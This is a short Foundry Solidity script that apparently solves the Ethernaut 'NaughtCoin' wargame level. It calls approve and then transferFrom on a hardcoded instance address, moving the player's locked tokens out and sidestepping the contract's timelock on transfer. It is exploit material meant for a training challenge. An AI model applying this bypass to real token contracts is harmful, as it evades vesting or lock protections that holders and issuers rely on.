pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
contract NaughtCoinScript is Script {
    function run() external {
        vm.startBroadcast();
        address instance = address(0x928a5F12A239710729524c85C9668C19597c4047);
        instance.call{value:0}(abi.encodeWithSignature("approve(address,uint256)", msg.sender, 1000000 * (10**uint256(decimals()))));
        instance.call{value:0}(abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender,address(0x1), 1000000 * (10**uint256(decimals()))));
    }

    function decimals() internal pure returns (uint) {
        return 18;
    }
}